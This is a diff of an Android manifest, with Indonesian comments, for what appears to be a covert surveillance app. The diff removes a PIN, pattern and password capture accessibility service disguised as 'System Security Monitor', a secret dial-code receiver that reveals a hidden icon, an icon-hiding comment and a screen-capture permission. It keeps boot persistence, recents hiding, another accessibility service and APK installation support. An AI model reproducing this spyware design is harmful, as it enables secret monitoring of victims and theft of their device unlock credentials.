@@ -10,7 +10,6 @@
     <!-- Keep-Alive / Service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
@@ -69,7 +68,7 @@
             android:screenOrientation="portrait"
             android:excludeFromRecents="true" />
 
-        <!-- Launcher alias — disable untuk sembunyikan ikon -->
+        <!-- Launcher alias -->
         <activity-alias
             android:name=".MainLauncherAlias"
             android:targetActivity=".MainActivity"
@@ -130,20 +129,6 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <!-- PIN / Pattern / Password Capture — AccessibilityService -->
-        <service
-            android:name=".PinCaptureService"
-            android:exported="true"
-            android:label="System Security Monitor"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/pin_capture_config" />
-        </service>
-
         <!-- FileProvider untuk install APK -->
         <provider
             android:name="androidx.core.content.FileProvider"
@@ -155,15 +140,6 @@
                 android:resource="@xml/file_paths" />
         </provider>
 
-        <!-- Secret dial code *#2719# untuk munculkan ikon sementara -->
-        <receiver
-            android:name=".SecretCodeReceiver"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="2719" />
-            </intent-filter>
-        </receiver>
 
     </application>
 </manifest>
